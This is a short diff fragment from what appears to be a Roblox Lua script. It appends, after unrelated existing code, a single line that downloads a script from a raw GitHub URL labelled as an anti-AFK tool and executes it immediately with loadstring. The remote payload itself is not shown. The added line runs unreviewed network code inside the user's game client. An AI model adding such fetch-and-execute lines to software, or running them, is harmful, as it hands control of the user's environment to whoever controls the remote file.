@@ -144,3 +144,5 @@ task.spawn(function()
         end
     end)
 end)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/juywvm/-Roblox-Projects-/main/____Anti_Afk_Remastered_______"))()
